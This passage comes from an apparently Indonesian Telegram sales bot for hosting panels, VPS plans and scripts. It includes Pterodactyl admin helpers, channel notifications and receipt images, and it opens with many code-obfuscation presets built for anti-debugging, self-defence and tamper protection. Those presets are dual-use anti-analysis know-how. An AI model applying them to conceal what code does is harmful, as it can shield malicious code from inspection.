        stringSplitting: 0.95,
        controlFlowFlattening: 0.95,
        shuffle: true,
        duplicateLiteralsRemoval: 0.75,
        deadCode: 0.3,
        calculator: true,
        opaquePredicates: 0.95,
        dispatcher: true,
        globalConcealing: true,
        lock: {
            selfDefending: true,
            antiDebug: true,
            integrity: true,
            tamperProtection: true
        }
    };
}

function getJapanObfuscationConfig() {
    const japaneseChars = [
        "あ", "い", "う", "え", "お", "か", "き", "く", "け", "こ",
        "さ", "し", "す", "せ", "そ", "た", "ち", "つ", "て", "と",
        "な", "に", "ぬ", "ね", "の", "は", "ひ", "ふ", "へ", "ほ",
        "ま", "み", "む", "め", "も", "や", "ゆ", "よ",
        "ら", "り", "る", "れ", "ろ", "わ", "を", "ん"
    ];

    const generateJapaneseName = () => {
        const length = Math.floor(Math.random() * 4) + 3;
        let name = "";
        for (let i = 0; i < length; i++) {
            name += japaneseChars[Math.floor(Math.random() * japaneseChars.length)];
        }
        return name;
    };

    return {
        target: "node",
        compact: true,
        renameVariables: true,
        renameGlobals: true,
        identifierGenerator: generateJapaneseName,
        stringEncoding: true,
        stringSplitting: 0.9,
        controlFlowFlattening: 0.9,
        flatten: true,
        shuffle: true,
        duplicateLiteralsRemoval: 0.75,
        deadCode: 0.25,
        calculator: true,
        opaquePredicates: 0.85,
        lock: {
            selfDefending: true,
            antiDebug: true,
            integrity: true,
            tamperProtection: true
        }
    };
}

function getJapanxArabObfuscationConfig() {
    const japaneseXArabChars = [
        "あ", "い", "う", "え", "お", "か", "き", "く", "け", "こ",
        "さ", "し", "す", "せ", "そ", "た", "ち", "つ", "て", "と",
        "な", "に", "ぬ", "ね", "の", "は", "ひ", "ふ", "へ", "ほ",
        "ま", "み", "む", "め", "も", "や", "ゆ", "よ","أ", "ب", "ت", "ث", "ج", "ح", "خ", "د", "ذ", "ر",
        "ز", "س", "ش", "ص", "ض", "ط", "ظ", "ع", "غ", "ف",
        "ق", "ك", "ل", "م", "ن", "ه", "و", "ي","ら", "り", "る", "れ", "ろ", "わ", "を", "ん" 
    ];

    const generateJapaneseXArabName = () => {
        const length = Math.floor(Math.random() * 4) + 3;
        let name = "";
        for (let i = 0; i < length; i++) {
            name += japaneseXArabChars[Math.floor(Math.random() * japaneseXArabChars.length)];
        }
        return name;
    };

    return {
        target: "node",
        compact: true,
        renameVariables: true,
        renameGlobals: true,
        identifierGenerator: generateJapaneseXArabName,
        stringCompression: true,
        stringConcealing: true,
        stringEncoding: true,
        stringSplitting: 0.95,
        controlFlowFlattening: 0.95,
        flatten: true,
        shuffle: true,
        rgf: false,
        dispatcher: true,
        duplicateLiteralsRemoval: 0.75,
        deadCode: 0.3,
        calculator: true,
        opaquePredicates: 0.9,
        lock: {
            selfDefending: true,
            antiDebug: true,
            integrity: true,
            tamperProtection: true
        }
    };
}

function getNebulaObfuscationConfig() {
    const generateNebulaName = () => {
        const chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
        const prefix = "NX";
        let randomPart = "";
        for (let i = 0; i < 4; i++) {
            randomPart += chars[Math.floor(Math.random() * chars.length)];
        }
        return `${prefix}${randomPart}`;
    };

    return {
        target: "node",
        compact: true,
        renameVariables: true,
        renameGlobals: true,
        identifierGenerator: generateNebulaName,
        stringCompression: true,
        stringConcealing: false,
        stringEncoding: true,
        stringSplitting: false,
        controlFlowFlattening: 0.75,
        flatten: true,
        shuffle: true,
        rgf: true,
        deadCode: 0.2,
        opaquePredicates: 0.75,
        dispatcher: true,
        globalConcealing: true,
        objectExtraction: true,
        duplicateLiteralsRemoval: 0.75,
        lock: {
            selfDefending: true,
            antiDebug: true,
            integrity: true,
            tamperProtection: true
        }
    };
}

function getNovaObfuscationConfig() {
    const generateNovaName = () => {
        const prefixes = ["nZ", "nova", "nx"];
        const randomPrefix = prefixes[Math.floor(Math.random() * prefixes.length)];
        const hash = crypto.createHash('sha256')
            .update(crypto.randomBytes(8))
            .digest('hex')
            .slice(0, 6);
        const suffix = Math.random().toString(36).slice(2, 5);
        return `${randomPrefix}_${hash}_${suffix}`;
    };

    return {
        target: "node",
        compact: true,
        renameVariables: true,
        renameGlobals: true,
        identifierGenerator: generateNovaName,
        stringCompression: true,
        stringConcealing: true,
        stringEncoding: true,
        stringSplitting: false,
        controlFlowFlattening: 0.5,
        flatten: true,
        shuffle: true,
        rgf: false,
        deadCode: 0.1,
        opaquePredicates: 0.5,
        dispatcher: true,
        globalConcealing: true,
        objectExtraction: true,
        duplicateLiteralsRemoval: 0.75,
        lock: {
            selfDefending: true,
            antiDebug: true,
            integrity: true,
            tamperProtection: true
        }
    };
}

function getUltraObfuscationConfig() {
    const generateUltraName = () => {
        const chars = "abcdefghijklmnopqrstuvwxyz";
        const numbers = "0123456789";
        const randomNum = numbers[Math.floor(Math.random() * numbers.length)];
        const randomChar = chars[Math.floor(Math.random() * chars.length)];
        return `z${randomNum}${randomChar}${Math.random().toString(36).substring(2, 6)}`;
    };

    return {
        target: "node",
        compact: true,
        renameVariables: true,
        renameGlobals: true,
        identifierGenerator: generateUltraName,
        stringCompression: true,
        stringEncoding: true,
        stringSplitting: 0.9,
        controlFlowFlattening: 0.9,
        flatten: true,
        shuffle: true,
        rgf: true,
        deadCode: 0.3,
        opaquePredicates: 0.9,
        dispatcher: true,
        lock: {
            selfDefending: true,
            antiDebug: true,
            integrity: true,
            tamperProtection: true
        }
    };
}

function getMaxObfuscationConfig(intensity) {
    const generateMaxName = () => {
        const chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
        const length = Math.floor(Math.random() * 4) + 4;
        let name = "mX";
        for (let i = 0; i < length; i++) {
            name += chars[Math.floor(Math.random() * chars.length)];
        }
        return name;
    };

    const flatteningLevel = intensity / 10;

    return {
        target: "node",
        compact: true,
        renameVariables: true,
        renameGlobals: true,
        identifierGenerator: generateMaxName,
        stringCompression: true,
        stringConcealing: true,
        stringEncoding: true,
        stringSplitting: flatteningLevel,
        controlFlowFlattening: flatteningLevel,
        flatten: true,
        shuffle: true,
        rgf: true,
        calculator: true,
        deadCode: flatteningLevel * 0.4,
        opaquePredicates: flatteningLevel,
        dispatcher: true,
        globalConcealing: true,
        objectExtraction: true,
        duplicateLiteralsRemoval: false,
        lock: {
            selfDefending: true,
            antiDebug: true,
            integrity: true,
            tamperProtection: true
        }
    };
}

function getSiuCalcrickObfuscationConfig() {
    const generateSiuCalcrickName = () => {
        const chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
        let randomPart = "";
        for (let i = 0; i < 6; i++) {
            randomPart += chars[Math.floor(Math.random() * chars.length)];
        }
        return `气CalceKarik和SiuSiu无${randomPart}`;
    };

    return {
        target: "node",
        compact: true,
        renameVariables: true,
        renameGlobals: true,
        identifierGenerator: generateSiuCalcrickName,
        stringCompression: true,
        stringEncoding: true,
        stringSplitting: 0.95,
        controlFlowFlattening: 0.95,
        shuffle: true,
        rgf: false,
        flatten: true,
        duplicateLiteralsRemoval: 0.75,
        deadCode: 0.3,
        calculator: true,
        opaquePredicates: 0.9,
        lock: {
            selfDefending: true,
            antiDebug: true,
            integrity: true,
            tamperProtection: true
        }
    };
}

function getXObfuscationConfig() {
    const generateXName = () => {
        return "xZ" + crypto.randomUUID().slice(0, 4);
    };

    return {
        target: "node",
        compact: true,
        renameVariables: true,
        renameGlobals: true,
        identifierGenerator: generateXName,
        stringCompression: true,
        stringConcealing: true,
        stringEncoding: true,
        stringSplitting: false,
        controlFlowFlattening: 0.5,
        flatten: true,
        shuffle: true,
        rgf: true,
        deadCode: false,
        opaquePredicates: 0.5,
        dispatcher: true,
        globalConcealing: true,
        objectExtraction: true,
        duplicateLiteralsRemoval: 0.75,
        lock: {
            selfDefending: true,
            antiDebug: true,
            integrity: true,
            tamperProtection: true
        }
    };
}

function getNewObfuscationConfig() {
    return {
        target: "node",
        compact: true,
        renameVariables: true,
        renameGlobals: true,
        identifierGenerator: "mangled",
        stringEncoding: true,
        stringSplitting: 0.95,
        controlFlowFlattening: 0.95,
        shuffle: true,
        duplicateLiteralsRemoval: 0.75,
        deadCode: 0.3,
        calculator: true,
        opaquePredicates: 0.95,
        dispatcher: true,
        globalConcealing: true,
        lock: {
            selfDefending: true,
            antiDebug: true,
            integrity: true,
            tamperProtection: true
        }
    };
}

function getBigObfuscationConfig() {
    const generateBigName = () => {
        const chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
        const length = Math.floor(Math.random() * 5) + 5;
        let name = "";
        for (let i = 0; i < length; i++) {
            name += chars[Math.floor(Math.random() * chars.length)];
        }
        return name;
    };

    return {
        target: "node",
        compact: true,
        renameVariables: true,
        renameGlobals: true,
        identifierGenerator: generateBigName,
        stringEncoding: true,
        stringSplitting: 0.75,
        controlFlowFlattening: 0.75,
        shuffle: true,
        duplicateLiteralsRemoval: 0.75,
        deadCode: 0.2,
        opaquePredicates: 0.75,
        lock: {
            selfDefending: true,
            antiDebug: true,
            integrity: true,
            tamperProtection: true
        }
    };
}

// -------------------- [ get all server offline ] -------------------- \\
async function getserver(domain, apikey, capikey) {
    let offlineServers = [];
    let totalServers = 0;
    let page = 1;
    let totalPages = 1;

    try {
        do {
            const res = await safeFetch(`${domain}/api/application/servers?page=${page}`, {
                method: "GET",
                headers: getHeaders(apikey),
            }, 30000);

            if (!res.ok) {
                throw new Error(`HTTP ${res.status}`);
            }

            const data = await res.json();
            const servers = data.data || [];
            totalPages = data.meta?.pagination?.total_pages || 1;
            totalServers += servers.length;

            for (const serverData of servers) {
                try {
                    const s = serverData.attributes;
                    const status = await cekstatus(domain, s.identifier, capikey);
                    
                    if (status === "offline") {
                        offlineServers.push({
                            id: s.id,
                            name: s.name,
                            identifier: s.identifier
                        });
                    }
                } catch (err) {
                    console.error(`Error checking server status:`, err.message);
                    continue;
                }
            }

            page++;
            await sleep(1000);

        } while (page <= totalPages);

        return { offlineServers, totalServers };

    } catch (err) {
        console.error(`Error in ambil server:`, err);
        return { offlineServers: [], totalServers: 0 };
    }
}

// -------------------- [ get all server ] -------------------- \\
async function getalluser(domain, apikey) {
    let offlineUsers = [];
    let totalUsers = 0;
    let page = 1;
    let totalPages = 1;

    try {
        do {
            const res = await safeFetch(`${domain}/api/application/users?page=${page}`, {
                method: "GET",
                headers: getHeaders(apikey),
            }, 30000);

            if (!res.ok) {
                throw new Error(`HTTP ${res.status}`);
            }

            const data = await res.json();
            const users = data.data || [];
            totalPages = data.meta?.pagination?.total_pages || 1;
            totalUsers += users.length;

            for (const userData of users) {
                try {
                    const u = userData.attributes;
                    
                    // Skip admin dan user ID 1
                    if (u.root_admin || u.id === 1) continue;
                    const hasServer = await cekuserandserver(domain, apikey, u.id);
                    
                    if (!hasServer) {
                        offlineUsers.push({
                            id: u.id,
                            username: u.username || "unknown",
                            email: u.email || "unknown"
                        });
                    }
                } catch (err) {
                    console.error(`Error processing user:`, err.message);
                    continue;
                }
            }

            page++;
            await sleep(1000);

        } while (page <= totalPages);

        return { offlineUsers, totalUsers };

    } catch (err) {
        console.error(`Error in ambil user:`, err);
        return { offlineUsers: [], totalUsers: 0 };
    }
}

// -------------------- [ check status server ] -------------------- \\
async function cekstatus(domain, identifier, capikey) {
    try {
        const res = await safeFetch(`${domain}/api/client/servers/${identifier}/resources`, {
            method: "GET",
            headers: getHeaders(capikey),
        }, 10000); // Timeout 10 detik

        if (res.ok) {
            const data = await res.json();
            return data.attributes?.current_state || "unknown";
        }
        return "offline";
    } catch {
        return "offline";
    }
}

// -------------------- [ check user server ] -------------------- \\
async function cekuserandserver(domain, apikey, userId) {
    try {
        const res = await safeFetch(`${domain}/api/application/servers?filter[user_id]=${userId}`, {
            method: "GET",
            headers: getHeaders(apikey),
        }, 15000);

        if (res.ok) {
            const data = await res.json();
            return data.data && data.data.length > 0;
        }
        return false;
    } catch {
        return false;
    }
}

// -------------------- [ Helper: Get Headers ]-------------------- \\
function getHeaders(apikey) {
    return {
        Accept: "application/json",
        "Content-Type": "application/json",
        Authorization: `Bearer ${apikey}`,
    };
}

// --------------------------------------------------------------------------
// [ SEND NOTIF CHANNEL ]
// --------------------------------------------------------------------------
async function sendTesti(type, data) {
    try {
        if (!config.channel_id) {
            console.log("Channel tidak dikonfigurasi, skip notifikasi");
            return;
        }
        
        const channelId = config.channel_id;
        let message = "";
        let buttons = [];
        const now = new Date();
        const waktu = now.toLocaleString("id-ID", { 
            timeZone: "Asia/Jakarta",
            day: "2-digit", 
            month: "long", 
            year: "numeric",
            hour: "2-digit",
            minute: "2-digit"
        });
        
        switch (type) {
            case "reseller":
                message = `
<blockquote>🖥️ <b>TRANSAKSI BERHASIL</b>
<code>──────────────────────</code>
      
👤 <b>𝗣𝗘𝗟𝗔𝗡𝗚𝗚𝗔𝗡</b>
├ Nama : <b>${data.username}</b>
└ ID   : <code>${data.userId}</code>
      
📦 <b>𝗣𝗘𝗦𝗔𝗡𝗔𝗡</b>
├ Item : <code>Reseller panel</code>
└ Metode : QRIS

✅ <b>𝗩𝗔𝗟𝗜𝗗𝗔𝗦𝗜</b>
├ Harga: Rp${data.amount.toLocaleString("id-ID")}
├ Order: <code>#${data.orderId}</code>
├ Waktu: ${waktu}
└ Stat : <b>BERHASIL (SUCCESS)</b>
<code>──────────────────────</code>
<i>Sistem Otomatis @${bot.botInfo.username}</i></blockquote>`;
                
                buttons = [[
                    { text: "🛒 BELI SEKARANG", url: `https://t.me/${bot.botInfo.username}?start` },
                    { text: "📢 TESTIMONI", url: "https://t.me/Xtrol_Team" }
                ]];
                break;
                
            case "admin_panel":
                message = `
<blockquote>🖥️ <b>TRANSAKSI BERHASIL</b>
<code>──────────────────────</code>
      
👤 <b>𝗣𝗘𝗟𝗔𝗡𝗚𝗚𝗔𝗡</b>
├ Nama : <b>${data.username}</b>
└ ID   : <code>${data.userId}</code>
      
📦 <b>𝗣𝗘𝗦𝗔𝗡𝗔𝗡</b>
├ Item : <code>Admin panel</code>
└ Metode : QRIS

✅ <b>𝗩𝗔𝗟𝗜𝗗𝗔𝗦𝗜</b>
├ Harga: Rp${data.amount.toLocaleString("id-ID")}
├ Order: <code>#${data.orderId}</code>
├ Waktu: ${waktu}
└ Stat : <b>BERHASIL (SUCCESS)</b>
<code>──────────────────────</code>
<i>Sistem Otomatis @${bot.botInfo.username}</i></blockquote>`;
                
                buttons = [[
                    { text: "🛒 BELI SEKARANG", url: `https://t.me/${bot.botInfo.username}?start` },
                    { text: "📢 TESTIMONI", url: "https://t.me/Xtrol_Team" }
                ]];
                break;
                
            case "script":
                message = `
<blockquote>🖥️ <b>TRANSAKSI BERHASIL</b>
<code>──────────────────────</code>
      
👤 <b>𝗣𝗘𝗟𝗔𝗡𝗚𝗚𝗔𝗡</b>
├ Nama : <b>${data.scriptName || "Script"}</b>
└ ID   : <code>${data.userId}</code>
      
📦 <b>𝗣𝗘𝗦𝗔𝗡𝗔𝗡</b>
├ Item : <code>Reseller panel</code>
└ Metode : QRIS

✅ <b>𝗩𝗔𝗟𝗜𝗗𝗔𝗦𝗜</b>
├ Harga: Rp${data.amount.toLocaleString("id-ID")}
├ Order: <code>#${data.orderId}</code>
├ Waktu: ${waktu}
└ Stat : <b>BERHASIL (SUCCESS)</b>
<code>──────────────────────</code>
<i>Sistem Otomatis @${bot.botInfo.username}</i></blockquote>`;
                
                buttons = [[
                    { text: "🛒 BELI SCRIPT", url: `https://t.me/${bot.botInfo.username}?start=buyscript` },
                    { text: "📢 TESTIMONI", url: "https://t.me/Xtrol_Team" }
                ]];
                break;
                
            case "panel":
                message = `
<blockquote>🖥️ <b>TRANSAKSI BERHASIL</b>
<code>──────────────────────</code>
      
👤 <b>𝗣𝗘𝗟𝗔𝗡𝗚𝗚𝗔𝗡</b>
├ Nama : <b>${data.username}</b>
└ ID   : <code>${data.userId}</code>
      
📦 <b>𝗣𝗘𝗦𝗔𝗡𝗔𝗡</b>
├ Item : <code>Reseller panel</code>
├ paket : ${data.package || "-"}
└ Metode : QRIS

✅ <b>𝗩𝗔𝗟𝗜𝗗𝗔𝗦𝗜</b>
├ Harga: Rp${data.amount.toLocaleString("id-ID")}
├ Order: <code>#${data.orderId}</code>
├ Waktu: ${waktu}
└ Stat : <b>BERHASIL (SUCCESS)</b>
<code>──────────────────────</code>
<i>Sistem Otomatis @${bot.botInfo.username}</i></blockquote>`;
                
                buttons = [[
                    { text: "🛒 BELI SEKARANG", url: `https://t.me/${bot.botInfo.username}?start` },
                    { text: "📢 TESTIMONI", url: "https://t.me/Xtrol_Team" }
                ]];
                break;
                
            case "vps":
                message = `
<blockquote>🖥️ <b>TRANSAKSI BERHASIL</b>
<code>──────────────────────</code>
      
👤 <b>𝗣𝗘𝗟𝗔𝗡𝗚𝗚𝗔𝗡</b>
├ Nama : <b>${data.username}</b>
└ ID   : <code>${data.userId}</code>
      
📦 <b>𝗣𝗘𝗦𝗔𝗡𝗔𝗡</b>
├ Item : <code>Reseller panel</code>
├ Paket : ${data.paket ? data.paket.toUpperCase() : "-"}
├ Spesifikasi : ${data.plan || "-"}
└ Metode : QRIS

✅ <b>𝗩𝗔𝗟𝗜𝗗𝗔𝗦𝗜</b>
├ Harga: Rp${data.amount.toLocaleString("id-ID")}
├ Order: <code>#${data.orderId}</code>
├ Waktu: ${waktu}
└ Stat : <b>BERHASIL (SUCCESS)</b>
<code>──────────────────────</code>
<i>Sistem Otomatis @${bot.botInfo.username}</i></blockquote>`;
                
                buttons = [[
                    { text: "🛒 BELI SEKARANG", url: `https://t.me/${bot.botInfo.username}?start` },
                    { text: "📢 CHANNEL", url: "https://t.me/Xtrol_Team" }
                ]];
                break;
                
            default:
                console.log(`Tipe notifikasi tidak dikenal: ${type}`);
                return;
        }
        
        await bot.telegram.sendMessage(channelId, message, { 
            parse_mode: "HTML", 
            disable_web_page_preview: true, 
            reply_markup: { inline_keyboard: buttons } 
        });
        
        console.log(`✅ Notifikasi ${type} terkirim ke channel`);
        
    } catch (error) {
        console.error(`❌ Gagal mengirim notifikasi ${type} ke channel:`, error.message);
    }
}

async function SendProduk(type, productData, addedBy) {
  try {
    if (!config.channel_id || !config.channel_id.trim()) {
      console.log("[INFO] Channel ID belum ada dongo");
      return;
    }

    const channel = config.channel_id;
    const now = new Date();
    const dateStr = now.toLocaleDateString("id-ID", { day: 'numeric', month: 'long', year: 'numeric' });
    const timeStr = now.toLocaleTimeString("id-ID", { hour12: false }).replace(/:/g, '.');
    const timestamp = `${dateStr}, ${timeStr}`;

    let message = "";

    const header = `<blockquote>🔔 <b>STOK BARU TELAH DITAMBAHKAN</b></blockquote>\n`;
    const footer = `\n<blockquote><b>SEGERA PESAN SEBELUM KEHABISAN 😊</b></blockquote>\n<b>Order lewat bot »</b> @${bot.botInfo?.username}`;

    if (type === "script") {
      message = header +
`<blockquote>📦<b>TYPE:</b> 📁 SCRIPT
📛<b>NAME:</b> ${escapeHTML(productData.nama)}
💰<b>HARGA:</b> Rp${productData.harga.toLocaleString('id-ID')}
👤<b>DI TAMBAHKAN OLEH:</b> ${escapeHTML(addedBy)}
🕒<b>WAKTU:</b> ${timestamp}</blockquote>` +
                footer;
    } 

    await bot.telegram.sendMessage(channel, message, {
      parse_mode: "HTML",
      disable_web_page_preview: true,
      reply_markup: { 
        inline_keyboard: [[
          { text: "🛒 BELI SEKARANG", url: `https://t.me/${bot.botInfo?.username}?start` }
        ]] 
      }
    });
    
  } catch (error) {
    console.error("[ERROR] Gagal mengirim notifikasi:", error.message);
  }
}

// --------------------------------------------------------------------------
// [ SEND START INFO TO CHANNEL ]
// --------------------------------------------------------------------------
async function sendStartInfoToChannel(user) {
  try {
    if (!config.channel_id) return;

    // Link video
    const videoUrl = "https://files.catbox.moe/e76xu3.mp4"; 

    const cleanFirstName = user.first_name || '';
    const cleanLastName = user.last_name || '';
    const fullName = `${cleanFirstName} ${cleanLastName}`.trim() || "Pelanggan Baru";
    const username = user.username ? `@${user.username}` : 'Tidak Ada';
    
    const now = new Date();
    const options = { 
      timeZone: 'Asia/Jakarta', 
      weekday: 'long',
      day: 'numeric',
      month: 'long', 
      year: 'numeric',
      hour: '2-digit',
      minute: '2-digit',
      hour12: false
    };
    
    const waktuWIB = now.toLocaleString('id-ID', options).replace(/\./g, ':');
    
    const startInfo = 
`<blockquote>✨ 𝗣𝗘𝗟𝗔𝗡𝗚𝗚𝗔𝗡 𝗕𝗔𝗥𝗨 𝗧𝗘𝗟𝗔𝗛 𝗧𝗜𝗕𝗔! ✨
━━━━━━━━━━━━━━━━━━━━━━━━━━━━
╭─ 👤 <b>𝗣𝗥𝗢𝗙𝗜𝗟 𝗣𝗘𝗠𝗕𝗘𝗟𝗜</b>
├ 👤 <b>Nama:</b> <code>${escapeHTML(fullName)}</code>
├ 🆔 <b>ID:</b> <code>${user.id}</code>
├ 🏷️ <b>Username:</b> <b>${escapeHTML(username)}</b>
╰─ 🗓️ <b>Waktu:</b> <code>${waktuWIB} WIB</code>
━━━━━━━━━━━━━━━━━━━━━━━━━━━━
╭─ 🚀 <b>𝗞𝗘𝗡𝗔𝗣𝗔 𝗛𝗔𝗥𝗨𝗦 𝗗𝗜 ${config.Botname ? config.Botname.toUpperCase() : 'Vyxxz! - BOT'}?</b>
├ ⚡ <b>𝗣𝗿𝗼𝘀𝗲𝘀 𝗢𝘁𝗼𝗺𝗮𝘁𝗶𝘀</b> - Gak pake lama!
├ 💎 <b>𝗞𝘂𝗮𝗹𝗶𝘁𝗮𝘀 𝗩𝗜𝗣</b> - Server anti lemot & stabil.
╰─ 🛡️ <b>𝗔𝗺𝗮𝗻 & 𝗧𝗲𝗿𝗽𝗲𝗿𝗰𝗮𝘆𝗮</b> - Transaksi 100% amanah.
━━━━━━━━━━━━━━━━━━━━━━━━━━━━
╭─ 📂 <b>𝗟𝗔𝗬𝗔𝗡𝗔𝗡 𝗨𝗧𝗔𝗠𝗔 𝗞𝗔𝗠𝗜:</b>
├ 📦 <b>Panel Pterodactyl</b> (Ram 1GB - Unlimited)
├ 🌐 <b>VPS DigitalOcean</b> (High Performance)
├ 🛠️ <b>Script & Bot WhatsApp</b>
╰ 💳 <b>Layanan Digital Lainnya</b>
━━━━━━━━━━━━━━━━━━━━━━━━━━━━
<i>"Solusi server terbaik untuk kebutuhan Anda hanya ada di sini!"</i></blockquote>`;

    await bot.telegram.sendVideo(config.channel_id, videoUrl, {
      caption: startInfo,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [
            { text: "⭐ 𝗧𝗘𝗦𝗧𝗜𝗠𝗢𝗡𝗜", url: `https://t.me/${config.channel_id.replace('@', '')}` },
            { text: "👨‍💻 𝗢𝗪𝗡𝗘𝗥", url: "https://t.me/ReyValdz" }
          ],
          [
            { text: "🛍️ 𝗕𝗘𝗟𝗔𝗡𝗝𝗔 𝗦𝗘𝗞𝗔𝗥𝗔𝗡𝗚", url: `https://t.me/${bot.botInfo.username}` }
          ]
        ]
      }
    });

  } catch (error) {}
}

/// ----------------------------------------------------------------- \\\
async function sendProvincePage(ctx, page) {
    const provinces = Object.keys(kotaID);
    const start = page * PROVINCE_PER_PAGE;
    const slice = provinces.slice(start, start + PROVINCE_PER_PAGE);
    const buttons = slice.map(p => [{ text: p, callback_data: `cuaca_prov|${p}|0` }]);
    const nav = [];
    if (page > 0) nav.push({ text: "⬅️ Prev", callback_data: `cuaca_prov_page|${page - 1}` });
    if (start + PROVINCE_PER_PAGE < provinces.length) nav.push({ text: "➡️ Next", callback_data: `cuaca_prov_page|${page + 1}` });
    if (nav.length) buttons.push(nav);
    ctx.reply("<blockquote>🌦️ Pilih Provinsi:</blockquote>", { reply_markup: { inline_keyboard: buttons } });
}

async function sendCityPage(ctx, prov, page) {
    const cities = kotaID[prov];
    const start = page * CITY_PER_PAGE;
    const slice = cities.slice(start, start + CITY_PER_PAGE);
    const buttons = slice.map(c => [{ text: c, callback_data: `cuaca_city|${c}` }]);
    const nav = [];
    if (page > 0) nav.push({ text: "⬅️ Prev", callback_data: `cuaca_prov|${prov}|${page - 1}` });
    if (start + CITY_PER_PAGE < cities.length) nav.push({ text: "➡️ Next", callback_data: `cuaca_prov|${prov}|${page + 1}` });
    nav.push({ text: "🔙 Provinsi", callback_data: `cuaca_back_prov` });
    buttons.push(nav);
    ctx.editMessageText(`<blockquote>🏙️ Pilih Kota (${prov}):</blockquote>`, { reply_markup: { inline_keyboard: buttons } });
}

let subdomainPages = {};
let subdomainData = {};

// --------------------------------------------------------------------------
// [ SUBDOMAIN ]
// --------------------------------------------------------------------------
function loadSubdomainData() {
    try {
        const subdomainPath = path.join(__dirname, "./FileData/database/subdomain.json");
        if (fs.existsSync(subdomainPath)) {
            const data = fs.readFileSync(subdomainPath, "utf8");
            subdomainData = JSON.parse(data);
            global.subdomain = subdomainData;
        }
    } catch (e) {
        console.error("❌ Gagal membaca subdomain.json:", e.message);
    }
}
loadSubdomainData();

fs.watch(path.join(__dirname, "./FileData/database/subdomain.json"), (eventType) => {
    if (eventType === 'change') loadSubdomainData();
});

async function showSubdomainSelection(ctx, userId) {
    const userData = subdomainPages[userId];
    if (!userData) return;

    const { host, ip, domains, currentPage, itemsPerPage } = userData;
    const totalPages = Math.ceil(domains.length / itemsPerPage);
    const startIndex = currentPage * itemsPerPage;
    const endIndex = Math.min(startIndex + itemsPerPage, domains.length);
    const pageDomains = domains.slice(startIndex, endIndex);

    let caption = `<blockquote>🌐 <b>Pilih Domain Tersedia</b>\n\n`;
    caption += `📌 Host: <code>${host}</code>\n`;
    caption += `📡 IP: <code>${ip}</code>\n`;
    caption += `📊 Halaman ${currentPage + 1} dari ${totalPages}</blockquote>`;

    const keyboard = { inline_keyboard: [] };

    // Tombol domain
    pageDomains.forEach((d, i) => {
        const index = startIndex + i;
        keyboard.inline_keyboard.push([
            { 
                text: `🌐 ${d}`, 
                callback_data: `select_domain_${index}_${host}|${ip}`
            }
        ]);
    });

    // Navigasi
    const navButtons = [];
    if (currentPage > 0) {
        navButtons.push({ 
            text: "⬅️ Kembali", 
            callback_data: `subdo_page_${userId}_${currentPage - 1}` 
        });
    }
    if (currentPage < totalPages - 1) {
        navButtons.push({ 
            text: "Lanjut ➡️", 
            callback_data: `subdo_page_${userId}_${currentPage + 1}` 
        });
    }
    if (navButtons.length > 0) {
        keyboard.inline_keyboard.push(navButtons);
    }

    // Tombol batal
    keyboard.inline_keyboard.push([
        { text: "❌ Batalkan", callback_data: `cancel_subdo_${userId}` }
    ]);

    try {
        if (ctx.callbackQuery) {
            await ctx.editMessageText(caption, { 
                parse_mode: "HTML",
                reply_markup: keyboard
            });
        } else {
            await ctx.reply(caption, { 
                parse_mode: "HTML",
                reply_markup: keyboard
            });
        }
    } catch (error) {
        console.error("Error showing subdomain selection:", error);
    }
}

// --------------------------------------------------------------------------
// [ STRUKTUR PEMBAYARAN ]
// --------------------------------------------------------------------------
async function paymentt(ctx, data) {
  try {
    const { orderId, nominal, username, userId } = data;
    const width = 800;
    const height = 1000;
    const canvas = createCanvas(width, height);
    const ctxCanvas = canvas.getContext('2d');

    // Background
    ctxCanvas.fillStyle = '#1a2980';
    ctxCanvas.fillRect(0, 0, width, height);
    
    // Header
    ctxCanvas.fillStyle = '#26d0ce';
    ctxCanvas.font = 'bold 48px "Segoe UI", Arial, sans-serif';
    ctxCanvas.textAlign = 'center';
    ctxCanvas.fillText('✅ PEMBAYARAN BERHASIL', width / 2, 100);

    // Kotak putih transparan
    ctxCanvas.fillStyle = 'rgba(255, 255, 255, 0.1)';
    ctxCanvas.fillRect(40, 150, width - 80, 600);

    // Informasi
    ctxCanvas.fillStyle = '#ffffff';
    ctxCanvas.font = 'bold 24px "Segoe UI", Arial, sans-serif';
    ctxCanvas.textAlign = 'left';
    
    let y = 220;
    const items = [
      `🆔 Order ID: ${orderId}`,
      `👤 Pelanggan: ${username} (${userId})`,
      `💰 Nominal: Rp ${nominal.toLocaleString('id-ID')}`,
      `💳 Metode: QRIS`,
      `⏱️ Waktu: ${new Date().toLocaleString('id-ID')}`,
      `📊 Status: LUNAS ✓`
    ];

    items.forEach(item => {
      ctxCanvas.fillText(item, 80, y);
      y += 50;
    });

    // Total
    ctxCanvas.font = 'bold 36px "Segoe UI", Arial, sans-serif';
    ctxCanvas.fillStyle = '#ffd700';
    ctxCanvas.fillText(`Rp ${nominal.toLocaleString('id-ID')}`, 500, 550);

    // Footer
    ctxCanvas.font = '20px "Segoe UI", Arial, sans-serif';
    ctxCanvas.fillStyle = '#a0a0a0';
    ctxCanvas.textAlign = 'center';
    ctxCanvas.fillText('Terima kasih telah melakukan pembayaran', width / 2, 800);
    ctxCanvas.fillText('© AldzyIsHere', width / 2, 850);

    // Convert ke buffer
    const buffer = canvas.toBuffer('image/png');

    // Kirim struk (tanpa button)
    await ctx.replyWithPhoto(
      { source: buffer },
      {
        caption: 
`<blockquote>✅ <b>PEMBAYARAN BERHASIL!</b></blockquote>

<blockquote>🆔 Order ID: <code>${orderId}</code>
💰 Nominal: Rp${nominal.toLocaleString('id-ID')}
⏱️ Waktu: ${new Date().toLocaleString('id-ID')}

<b>Status: LUNAS ✓</b></blockquote>`,
        parse_mode: "HTML"
      }
    );

  } catch (error) {
    console.error("Error creating receipt:", error);
    
    // Fallback text
    await ctx.reply(
      `<blockquote>✅ <b>PEMBAYARAN BERHASIL!</b></blockquote>

<blockquote>🆔 Order ID: <code>${orderId}</code>
💰 Nominal: Rp${nominal.toLocaleString('id-ID')}
⏱️ Waktu: ${new Date().toLocaleString('id-ID')}

<b>Status: LUNAS ✓</b></blockquote>`,
      { parse_mode: "HTML" }
    );
  }
}

// --------------------------------------------------------------------------
